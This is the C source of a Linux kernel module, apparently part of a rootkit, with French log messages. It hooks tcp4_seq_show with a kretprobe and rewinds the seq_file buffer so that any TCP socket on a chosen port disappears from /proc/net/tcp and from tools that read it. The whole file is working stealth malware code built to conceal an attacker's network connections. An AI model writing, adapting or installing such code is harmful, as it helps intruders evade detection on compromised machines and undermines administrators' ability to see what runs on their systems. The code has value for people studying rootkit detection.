#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/seq_file.h>
#include <net/sock.h>
#include "hide_net.h"

static unsigned int hidden_port = 0;

struct tcp_data {
    struct seq_file *seq;
    void           *v;
    size_t          count;
};

static int entry_tcp4_seq_show(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct tcp_data *d = (struct tcp_data *)ri->data;
    d->seq   = (struct seq_file *)regs->di;
    d->v     = (void *)regs->si;
    d->count = d->seq->count;
    return 0;
}

static int ret_tcp4_seq_show(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct tcp_data *d = (struct tcp_data *)ri->data;
    struct sock *sk;

    if (!hidden_port || d->v == SEQ_START_TOKEN)
        return 0;

    sk = (struct sock *)d->v;
    if (sk->sk_num == hidden_port)
        d->seq->count = d->count;

    return 0;
}

static struct kretprobe krp_tcp = {
    .handler        = ret_tcp4_seq_show,
    .entry_handler  = entry_tcp4_seq_show,
    .data_size      = sizeof(struct tcp_data),
    .maxactive      = 20,
    .kp.symbol_name = "tcp4_seq_show",
};

void set_hidden_port(unsigned int port)
{
    hidden_port = port;
    printk(KERN_INFO "port %u caché\n", port);
}

int hide_net_init(void)
{
    int ret = register_kretprobe(&krp_tcp);
    if (ret < 0) {
        printk(KERN_ERR "kretprobe tcp4_seq_show échoué: %d\n", ret);
        return ret;
    }
    printk(KERN_INFO "tcp4 hookée\n");
    return 0;
}

void hide_net_exit(void)
{
    unregister_kretprobe(&krp_tcp);
    printk(KERN_INFO "tcp4 remis en place\n");
}
